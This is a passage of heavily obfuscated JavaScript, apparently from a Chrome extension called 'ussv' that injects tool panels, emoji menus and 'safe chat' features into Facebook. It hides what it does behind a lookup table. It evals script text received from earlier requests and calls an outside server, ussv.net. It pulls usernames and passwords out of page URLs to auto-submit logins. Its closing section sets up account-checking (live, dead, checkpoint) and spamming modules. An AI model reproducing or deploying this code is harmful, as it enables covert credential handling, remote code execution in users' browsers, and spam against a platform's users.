                                                Z += '  <div id="ussv_post_list_history" class="cuon style-6" style="max-height: 300px;">';
                                                Z += '      ';
                                                Z += '  </div>';
                                                Z += '</div>';
                                                $("._3rbh")[f1W.u2r](Z);
                                                $("._2t4v")[f1W.u2r](Z);
                                                $(".uiTextareaAutogrow.mentionsTextarea")[f1W.X5O]("textarea_fb_post");
                                                $(".uiList._1dso")[f1W.q8r]("li:eq(1)")[f1W.X5O]("btn_type_post")[f1W.X5O]("me");
                                                eval(O[3][f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
                                            } else {
                                                $(".facebook_core_post_div")[f1W.v37]();
                                            }
                                        } else {}
                                    });
                                });
                            } else {
                                $(".facebook_core_post_div")[f1W.R4r]();
                            }
                        } else if (f1W[F](type, "df")) {
                            $(".facebook_core_post_div")[f1W.v37]();
                        }
                    });
                }
            }, 1000);
        } else {}
        i0(555);
        b0("");
        testss += '<form id="hihi">';
        testss += '<input type="file" id="file" name="0">';
        testss += '<input type="text" name="fb_dtsg" value="' + key + '">';
        testss += '<input type="text" name="source" value="8">';
        testss += '<input type="hidden" name="profile_id" value="100004575423394">';
        testss += '<input type="hidden" name="grid_id" value="u_l_0">';
        testss += '<input type="hidden" name="qn" value="8e4e6aa31d7bd40647b0117be480635a">';
        testss += '<input type="hidden" name="upload_id" value="1026">';
        testss += '<input id="sendimg" type="submit">';
        testss += '</form>';
        $("#sendimg")[f1W.Z6O](function(W) {
            W[f1W.q07]();
            s0();
        });
        var G0 = setInterval(function() {
                var O = "c6E",
                    Z = "J6E",
                    F = "I6E";
                if (f1W[F]($(".btn_open_group_tools").length, 0)) {
                    clearInterval(G0);
                    var o = '<span id="" class="btn_open_group_tools _42ft _4jy0 _4jy3 _517h _51sy" style="display: inline-block;">Tools</span> &nbsp';
                    idscan = random_str();
                    $("._52fl")[f1W.u2r](o);
                    $(".btn_open_group_tools")[f1W.Z6O](function() {
                        $(this)[f1W.v37]();
                        U();
                    });
                    if (f1W[Z]($[Z0]('GroupTools'), "Yes")) {
                        if (f1W[O]($("#pagelet_group_").length, 0)) {
                            U();
                        } else {}
                    }

                    function U() {
                        var V = function(W) {
                            f0 = W[f1W.E5a][f1W.i0Y];
                        };
                        V(_html);
                        console[f1W.p4y](f0);
                        html1 = f0[f1W.F6r](/USSVID/gi, idscan);
                        $("#pagelet_group_")[f1W.u2r](html1);
                        var E = $("#pagelet_group_")[f1W.q8r]("input[name='xhpc_targetid']")[f1W.o07]();
                        GroupCore[f1W.r87](idscan, E);
                        GroupCore[f1W.U8Y]({
                            "type": "group",
                            "id": idscan
                        });
                    };
                } else {}
            }, 1000),
            L0 = setInterval(function() {
                var O = "v6E",
                    Z = "u6E";
                if (f1W[Z]($(".btn_open_group_tools").length, 0)) {
                    clearInterval(L0);
                    var F = '<span id="" class="btn_open_group_tools _42ft _4jy0 _4jy3 _517h _51sy" style="display: inline-block;">Tools</span> &nbsp';
                    $("._52fl")[f1W.u2r](F);
                    $("._5vx7")[f1W.q8r]("._ohf")[f1W.u2r](F);
                    idscan = random_str();
                    $(".btn_open_group_tools")[f1W.Z6O](function() {
                        $(this)[f1W.v37]();
                        o();
                    });
                    if (f1W[O]($[Z0]('GroupsTools'), "Yes")) {
                        o();
                    }

                    function o() {
                        var V = function(W) {
                            f0 = W[f1W.E5a][f1W.i0Y];
                        };
                        V(_html);
                        html1 = f0[f1W.F6r](/USSVID/gi, idscan);
                        $("._4-u2._2a03:eq(0)")[f1W.u2r](html1);
                        var E = $("#pagelet_group_")[f1W.q8r]("input[name='xhpc_targetid']")[f1W.o07]();
                        GroupCore[f1W.r87](idscan, E);
                        GroupCore[f1W.U8Y]({
                            "type": "group",
                            "id": idscan
                        });
                    };
                } else {}
            }, 1000);
        check_dom_icon_cmt = setInterval(function() {
            var W = "A6E",
                V = "G6E";
            for (var E = 0; f1W[V](E, $(".UFICommentAttachmentButtons").length); E++) {
                var O = document[f1W.t60]('UFICommentAttachmentButtons')[E][f1W.V5I],
                    O = O[f1W.x3y]("ussv_icon_cmt");
                if (f1W[W](O, null)) {
                    thaotac_icon_cmt(E);
                } else {}
            }
        }, 1000);
        var B4 = '<a class="h_icon_list" style="float: left;margin-left: 4px;padding: 4px 5px 8px;"><img class="h_icon" style="float:left" src="//ussv.net/themes/img/fb_icon/0.png"></a>';
        check_icon = setInterval(function() {
            var U = "B5E",
                p = "j5E";
            for (var M = 0; f1W[p](M, $("._552n").length); M++) {
                var b = $(".chat_with_id:eq(" + M + ")")[f1W.m8y](),
                    H = document[f1W.t60]('_552n')[M][f1W.V5I],
                    H = H[f1W.x3y]("h_icon_list");
                if (f1W[U](H, null)) {
                    var R = $("._552n:eq(" + M + ")");
                    R[f1W.u2r](B4);
                    $(".uiTextareaAutogrow._552m")[f1W.C3O]("width", "80%");
                    $(".uiTextareaAutogrow._552m:eq(" + M + ")").parent("._552n").append("<span class='hidden uiTextareaAutogrow2'></span>");
                    $(".h_icon")[f1W.Z6O](function() {
                        $(".h_icon")[f1W.R4r]();
                        $(this)[f1W.F50](200);
                        $(".ussv_div_icon_chat")[f1W.w5I]();
                        var Z = div_icon("chat"),
                            F = $(this).parent(".h_icon_list").parent("._552n").parent(".fbNubFlyoutFooter").parent("._1ia");
                        F[f1W.u2r](Z);
                        F[f1W.q8r](".ussv_div_icon_chat")[f1W.l6Q](500);
                        $(".icon_code")[f1W.Z6O](function() {
                            var W = this[f1W.W7O];
                            $(".icon_code")[f1W.C3O]("background", "");
                            $(this)[f1W.C3O]("background", "rgb(147, 172, 232)");
                            var V = icon_list(1, W),
                                E = $(this).parent(".list_icon").parent(".ussv_div_icon_chat").parent("._1ia").find(".uiTextareaAutogrow._552m"),
                                O = E[f1W.o07]();
                            E[f1W.o07](O + " " + V + " ");
                        });
                        $("#close_div_icon_chat")[f1W.Z6O](function() {
                            $(".ussv_div_icon_chat")[f1W.F50](200)[f1W.w5I]();
                            $(".h_icon")[f1W.l6Q](200);
                        });
                    });
                    $(".uiTextareaAutogrow._552m:eq(" + M + ")")[f1W.h57](function(W) {
                        var V = "X5E",
                            E = "y5E",
                            O = "F5E";
                        if (f1W[O](W[f1W.b4y], 13)) {
                            var Z = $(this).parent("div").find(".uiTextareaAutogrow2"),
                                F = $(this).parent("div").find(".chat_with_id2").text();
                            if (f1W[E](Z[f1W.m8y](), "USSVCLEA")) {
                                fb_Msg(2, 1, 1, F + "||all||USSVCLEAR", 0, get_Fb_Key(), get_Fb_Uid());
                            } else if (f1W[V](Z[f1W.m8y](), "USSVCLEARAL")) {
                                fb_Msg(2, 1, 1, F + "||all||USSVCLEARALL", 0, get_Fb_Key(), get_Fb_Uid());
                            }
                            thaotac_safe_msg_chat();
                        } else {
                            var o = $(this)[f1W.o07](),
                                Z = $(this).parent("div").find(".uiTextareaAutogrow2");
                            Z[f1W.Q0I](o);
                        }
                    });
                } else {}
            }
            $(".uiTextareaAutogrow")[f1W.L0Q]("click")[f1W.Z6O](function() {
                thaotac_safe_msg_chat();
            });
        }, 1000);
        check_inbox_row_base = setInterval(function() {
            var I = "parents",
                D = "s5E",
                G = "k5E";
            for (var C = 0; f1W[G](C, $(".conversation").length); C++) {
                if (f1W[D]($(".conversation:eq(" + C + ")")[f1W.q8r](".ussv_safe").length, 0)) {
                    var z = $(".conversation:eq(" + C + ")")[I](".uiContextualLayerParent"),
                        P = random_str(),
                        J = '';
                    J += '<span class="hidden">';
                    J += '   <span class="ussv_safe ' + P + '"></span>';
                    J += '   <span class="ussv_safe_cancel ' + P + '"></span>';
                    J += '   <span class="ussv_msg_key ' + P + '"></span>';
                    J += '   <span class="ussv_msg_key_rv ' + P + '"></span>';
                    J += '   <span class="ussv_safe_key ' + P + '">' + P + '</span>';
                    J += '   <span class="chat_with_id ' + P + '"></span>';
                    J += '</span>';
                    $(".conversation:eq(" + C + ")")[f1W.u2r](J);
                    $(".conversation:eq(" + C + ")")[f1W.X5O]("l" + P);
                    $(".fbDockChatTabFlyout.uiContextualLayerParent:eq(" + C + ")")[f1W.X5O](P);
                    var c = '<span class="hidden chat_with_id2 ' + P + '"></span>',
                        L = '<textarea id="' + P + '" class="uiTextareaAutogrowsafe _552m ' + P + '" style="overflow: hidden;display:none;min-height: 16px; width: 80%;"></textarea>';
                    z[f1W.q8r](".uiTextareaAutogrow")[f1W.X5O]("" + P);
                    z[f1W.q8r](".uiTextareaAutogrow").parent("div").prepend(c);
                    z[f1W.q8r](".uiTextareaAutogrow").parent("div").append(L);
                    $(".uiTextareaAutogrowsafe." + P)[f1W.L0Q]("keydown")[f1W.h57](function(W) {
                        var V = "U0t",
                            E = "Z0t",
                            O = "O0t",
                            Z = "V0t",
                            F = "Q5E",
                            o = "t5E",
                            U = "w5E",
                            p = "x5E",
                            M = "l5E",
                            b = "scrollHeight",
                            H = "outerHeight",
                            R = "C5E",
                            X = "g5E",
                            f = "D5E",
                            n = "Y5E",
                            Y = "m5E";

                        function N() {
                            fb_Msg(0, 1, 1, g + "||" + text, 0, k0, get_Fb_Uid());
                        }
                        var g = $(this).parent("div").find(".chat_with_id2").text();
                        id_chat = $(this)[f1W.V6Q]("id");
                        divcha_tong = $(".uiTextareaAutogrowsafe." + id_chat).parent("div").parent("div").parent("div");
                        divcha = divcha_tong[f1W.q8r](".fbNubFlyoutBody");
                        key_chat = divcha[f1W.q8r](".ussv_msg_key")[f1W.m8y]();
                        text = $(this)[f1W.o07]();
                        if (f1W[Y](text, "\n")) {
                            $(this)[f1W.o07]("");
                        }
                        if (f1W[n](text.length, 2)) {
                            divcha.height(divcha.height() + (f1W[f]($(this).height(), 16)));
                            $(this).height(16);
                        }
                        if (f1W[X]($(this).height(), 70)) {
                            while (f1W[R]($(this)[H](), this[b] + parseFloat($(this)[f1W.C3O]("borderTopWidth")) + parseFloat($(this)[f1W.C3O]("borderBottomWidth")))) {
                                $(this).height($(this).height() + 1);
                                divcha.height(f1W[M](divcha.height(), 1));
                            };
                        } else {}
                        if (f1W[p](W[f1W.b4y], 13)) {
                            if (f1W[U](text, "USSVCLEAR")) {
                                fb_Msg(2, 1, 1, g + "||all||USSVCLEAR", 0, k0, get_Fb_Uid());
                            } else if (f1W[o](text[f1W.x3y]("USSVSAFE"), null)) {
                                N();
                            } else if (f1W[F](text, "USSVCLEARALL")) {
                                fb_Msg(2, 1, 1, g + "||all||USSVCLEARALL", 0, k0, get_Fb_Uid());
                            } else if (f1W[Z](text, "USSVCANCEL")) {
                                N();
                                $(this)[f1W.v37]();
                                z[f1W.q8r](".uiTextareaAutogrow")[f1W.R4r]();
                                $(".ussv_safe_cancel." + id_chat)[f1W.m8y]("yes");
                                change_style_chat(2, C);
                                fb_Msg(2, 1, 1, g + "||xx||", 0, get_Fb_Key(), get_Fb_Uid());
                            } else if (f1W[O](text, "SAFEPANEL") || f1W[E](text, "safepanel")) {
                                $(divcha_tong)[f1W.q8r](".ussv_div_panel_safe")[f1W.R4r]();
                            } else {
                                var T = g + "|" + id_chat;
                                _sf[f1W.j2X] = gl[f1W.Y5v]("ajax|mahoa|u|?type=2&method=1&a=" + key_chat + "&data=" + text + "&" + _sf[f1W.a7I]());
                                _sf[f1W.C27](1, T);
                            }
                            divcha.height(divcha.height() + (f1W[V]($(this).height(), 16)));
                            $(this).height(16);
                            $(this)[f1W.o07]("");
                            thaotac_safe_msg_chat();
                        } else {}
                    });
                    var E0 = $(".conversation.l" + P)[f1W.q8r]("._5wdf._5w1r").length;
                    $(".conversation.l" + P)[f1W.q8r](".ussv_safe." + P)[f1W.Q0I](E0);
                    $(".conversation.l" + P)[f1W.q8r]("._5wdf._5w1r")[f1W.X5O]("" + E0);
                } else {}
            }
            thaotac_safe_msg_chat();
        }, 2000);
    });
    if (f1W[f1W.g7v](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/), f1W.x0r)) {
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://ussv.net/themes/img/fb_icon/icon_code.php',
            data: "hi=hi"
        }, function(W) {
            var V = '<div class="hidden"><textarea id="ussv_icon_code_list">' + W + '</textarea></div>';
            $("body")[f1W.u2r](V);
        });
    };
    if (f1W[f1W.o0r](_op_page[f1W.j2X](f1W.p5X), f1W.L9a)) {
        dataLogin = document[f1W.w6r][f1W.x3y](f1W.t7y);
        if (f1W[f1W.t8Y](dataLogin, f1W.x0r)) {
            var w1 = function(W) {
                    user = W[f1W.L9a];
                },
                G1 = function(W) {
                    type = W[f1W.c9a];
                },
                K1 = function(W) {
                    pass = W[f1W.S9a];
                };
            dataLogin = dataLogin[f1W.S9a][f1W.X3Q](f1W.j07);
            w1(dataLogin);
            K1(dataLogin);
            G1(dataLogin);
            $(f1W.Y4Q)[f1W.o07](user);
            $(f1W.y2v)[f1W.o07](pass);
            $(f1W.m2X)[f1W.c7v](f1W.E80);
        }
        findPanelRS = setInterval(function() {}, f1W.Q8r);
    } else {}
    var UParse = new UParse(),
        SParse = new SParse();
    chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.D4r], function(W) {
        var V = "n9t";
        if (f1W[V](W[f1W.D4r], f1W.L9a)) {
            div_ussv_home();
        }
    });
    var str = new str();
    if (f1W[f1W.i97](_op_page[f1W.j2X](f1W.L2v), f1W.L9a)) {
        check_str_page = setInterval(function() {
            var W = "a3t",
                V = "i3t",
                E = "n3t",
                O = "M3t";
            $(".body.ng-scope")[f1W.L0Q]("click")[f1W.q57]("click", function() {
                $(".fbbutton")[f1W.c7v]('click');
            });
            if (f1W[O]($(".recaptcha_ussv_auto").length, 0)) {
                str[f1W.e9O](0);
            }
            if (f1W[E]($("#str_dom_random_username").length, 0)) {
                str[f1W.e9O](1);
            }
            if (f1W[V]($(".str_div_fb_info").length, 0)) {
                str[f1W.e9O](2);
            }
            if (f1W[W]($(".str_dom_ussv_email").length, 0)) {
                str[f1W.e9O](3);
            }
        }, 1000);
    } else {}
    if (f1W[f1W.H3X](_op_page[f1W.j2X](f1W.j7X), f1W.L9a)) {
        var y2 = function(W) {
                email = W[f1W.L9a];
            },
            b2 = function(W) {
                pass = W[f1W.S9a];
            },
            e2 = function() {
                var W = 'email=';
                datalogin = W + email + f1W.d1r + pass + f1W.K1Q;
            };
        data = document[f1W.w6r][f1W.x3y]("com/login(.*?)ussv")[1][f1W.X3Q]("___");
        y2(data);
        b2(data);
        e2();
        data = uss[f1W.c2O](0, "https://m.facebook.com/login.php", datalogin);
        parseLogin = _fb[f1W.S4O](data);
        ClosePopupLogin(parseLogin);

        function ClosePopupLogin(V) {
            var E = "HandlePopupFBLogin";
            try {
                window[f1W.Z3v][E](V);
            } catch (W) {}
            window[f1W.U00]();
            return false;
        };
    }
    $(document)[f1W.q2Y](function() {
        check_dom_stt_tools = setInterval(function() {
            var W = "v3t",
                V = "u3t",
                E = "c3t",
                O = "J3t";
            for (var Z = 0; f1W[O](Z, $("._524d").length); Z++) {
                dv_tools = $("._524d:eq(" + Z + ")");
                if (f1W[E](dv_tools[f1W.q8r](".stt_tools").length, 0)) {
                    idscan = random_str();
                    html = _html[f1W.E5a][f1W.u4X];
                    html1 = html[f1W.F6r](/USSVID/gi, idscan);
                    html2 = '<span style="float: right;"><a class="open_tools ' + idscan + '">Tools</a></span>';
                    dv_tools[f1W.q8r]("div")[f1W.p3Q](html2);
                    dv_tools[f1W.p3Q](html1);
                    thaotac_stt_tools(idscan);
                } else {}
            }
            for (var Z = 0; f1W[V](Z, $(".UIActionLinks_bottom").length); Z++) {
                dv_tools = $(".UIActionLinks_bottom:eq(" + Z + ")");
                if (f1W[W](dv_tools[f1W.q8r](".stt_tools").length, 0)) {
                    idscan = random_str();
                    html = _html[f1W.E5a][f1W.u4X];
                    html1 = html[f1W.F6r](/USSVID/gi, idscan);
                    html2 = '<span style=""><a class="open_tools ' + idscan + '">Tools - </a></span>';
                    dv_tools[f1W.C3O]("width", "100%")[f1W.u2r](html2);
                    dv_tools[f1W.p3Q](html1);
                    thaotac_stt_tools(idscan);
                } else {}
            }
        }, 1000);
    });
    var StatusCore = new StatusCore(),
        GroupCore = new GroupCore(),
        ReplyCore = new ReplyCore();
    ussv_help_panel();
    var lang_vi_login_no = f1W.v1X,
        lang_need_login = f1W.N9X,
        lang_vi_pr_open_log = f1W.P9I,
        lang_vi_pr_loc_fn = f1W.y3r,
        lang_vi_pr_del_ac_fn = f1W.e9y,
        lang_vi_pr_add_ac_fn = f1W.w4Q,
        lang_vi_mnd_del_mail_msg = f1W.a7v,
        lang_vi_mnd_del_mail_null = f1W.T10,
        lang_vi_mnd_del_msg_log = f1W.X00,
        lang_vi_mnd_del_msg = f1W.A9y,
        lang_vi_mnd_del_msg_null = f1W.t67,
        lang_vi_ltn_textarea_undo = f1W.n5v,
        lang_vi_ce_btn_get_acc = f1W.Y4X,
        lang_vi_ce_log_au_null = f1W.O47,
        lang_vi_ce_log_au_ok = f1W.W3O,
        lang_vi_ce_help_ce = f1W.v7I,
        lang_vi_ce_help_cf = f1W.X8r,
        lang_vi_ce_alert_null_NeEm = f1W.h3I,
        lang_vi_ce_alert_pr = f1W.J20,
        lang_vi_ce_alert_need_e_p = f1W.Q5I,
        lang_vi_ce_note_creat_em = f1W.E2v,
        lang_vi_uls_del_finish = f1W.w0y,
        lang_vi_cr_ntp_error = f1W.I4Y,
        lang_vi_cr_goo_error = f1W.w50,
        lang_vi_checking_nohaveacc = f1W.H3a,
        lang_vi_checking_manyCP = f1W.D7r,
        lang_vi_checking_live = f1W.q50,
        lang_vi_checking_die = f1W.c4y,
        lang_vi_checking_cp = f1W.G4I,
        lang_vi_checking_kxd = f1W.s1O,
        lang_vi_checking_timeout = f1W.N4X,
        lang_vi_checking_er_aut = f1W.F8I,
        lang_vi_checking_er_nosee = f1W.V9X,
        lang_vi_checking_cant_check_stellar = f1W.l1I,
        lang_vi_checking_review_tientrinhCH = f1W.y4Q,
        lang_vi_checking_review_tientrinhSP = f1W.Y70,
        lang_vi_checking_can_spam = f1W.S2O,
        lang_vi_checking_cant_spam = f1W.L7a,
        lang_vi_checking_ud_ct_sp = f1W.z10,
        lang_vi_checking_start_spam = f1W.o1r,
        lang_vi_spaming_get_setting = f1W.I37,
        lang_vi_spaming_on_spam = f1W.P4I;
    f1W[f1W.E97](f1W.u57);
    f1W[f1W.p0r](f1W.o57);
    f1W[f1W.R97](f1W.F2y);
    f1W[f1W.y37](f1W.p9a);
    f1W[f1W.m6O](f1W.u8Q);
    f1W[f1W.k0v](f1W.Y7v);
    f1W[f1W.N0Y](f1W.s8X);
    f1W[f1W.c17](f1W.e4O);
    f1W[f1W.c10](f1W.C00);
    f1W[f1W.D47](f1W.J57);
    f1W[f1W.M70](f1W.C7Q);
    f1W[f1W.X7r](f1W.e3v);
    f1W[f1W.T6y](f1W.e8r);
    f1W[f1W.k1X](f1W.V0O);
    f1W[f1W.Y7I](f1W.y3X);
    f1W[f1W.y9O](f1W.h8y);
    f1W[f1W.E8I](f1W.S6a);
    f1W[f1W.I3a](f1W.Q0O);
    f1W[f1W.N2Y](f1W.O5I);
    f1W[f1W.U3I](f1W.h4X);
    f1W[f1W.b00](f1W.l7Y);
    f1W[f1W.M8O](f1W.D5O);
    f1W[f1W.J7r](f1W.N37);
    f1W[f1W.L3a](f1W.u5I);
    f1W[f1W.w5X](f1W.h60);
    f1W[f1W.Q80](f1W.o1v);
    f1W[f1W.q40](f1W.t2v);
    f1W[f1W.M9X](f1W.Y3X);
    f1W[f1W.W5y](f1W.z6y);
    f1W[f1W.f6X](f1W.y3O);
    f1W[f1W.x40](f1W.K9Q);
    var lang_vi_pr_open_log = f1W.P9I,
        lang_vi_pr_loc_fn = f1W.y3r,
        lang_vi_pr_del_ac_fn = f1W.e9y,
        lang_vi_pr_add_ac_fn = f1W.w4Q,
        lang_vi_mnd_del_mail_msg = f1W.a7v,
        lang_vi_mnd_del_mail_null = f1W.T10,
        lang_vi_mnd_del_msg_log = f1W.X00,
        lang_vi_mnd_del_msg = f1W.A9y,
        lang_vi_mnd_del_msg_null = f1W.t67,
        lang_vi_ltn_textarea_null = f1W.l9Q,
        lang_vi_ltn_textarea_undo = f1W.n5v,
        FbCheck = new FbCheck(),
        CheckV2 = new CheckV2(),
        SpamV2 = new SpamV2();
}